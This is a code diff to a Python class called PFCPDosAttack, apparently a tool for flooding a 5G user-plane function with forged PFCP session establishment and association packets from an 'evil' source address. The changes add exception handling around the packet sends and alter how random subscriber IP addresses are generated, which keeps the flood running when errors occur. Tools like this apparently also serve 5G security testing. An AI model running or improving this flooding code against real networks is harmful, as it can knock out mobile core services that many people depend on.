@@ -242,7 +242,7 @@ class PFCPDosAttack:
     
     def new_ue_addr(self, randomize=False):
         if self.randomize or randomize:
-            return ".".join(str(random.randint(1, 254)) for _ in range(4))
+            return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
         next_ip = self.ue_base_addr + self._ue_counter
         self._ue_counter += 1
@@ -317,17 +317,23 @@ class PFCPDosAttack:
         
         if self.prepare:
             for i in range(start_index, start_index+count):
-                send(self.pfcp_establishment_packet_list[i])
+                try:
+                    send(self.pfcp_establishment_packet_list[i])
+                except Exception as e:
+                    print(f"[DoS][Worker] Error sending PFCP session establishment packet: {e}")
         else:
             pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
             for i in range(count):
-                pfcp_obj.Send_PFCP_session_establishment_req(
-                    seid=self.new_seid(), 
-                    ue_addr=self.new_ue_addr(),
-                    teid=self.new_teid(),
-                    random_seq=self.randomize,
-                    random_far_number=self.random_far_number
-                )
+                try:
+                    pfcp_obj.Send_PFCP_session_establishment_req(
+                        seid=self.new_seid(), 
+                        ue_addr=self.new_ue_addr(),
+                        teid=self.new_teid(),
+                        random_seq=self.randomize,
+                        random_far_number=self.random_far_number
+                    )
+                except Exception as e:
+                    print(f"[DoS][Worker] Error sending PFCP session establishment request: {e}")
                 
             
         if self.verbose:
@@ -351,7 +357,10 @@ class PFCPDosAttack:
         
         start_time = time.time()
         
-        send(pfcp_association_packet)
+        try:
+            send(pfcp_association_packet)
+        except Exception as e:
+            print(f"[DoS] Error sending PFCP association packet: {e}")
         
         thread_offset = 0
         for i in range(num_threads):
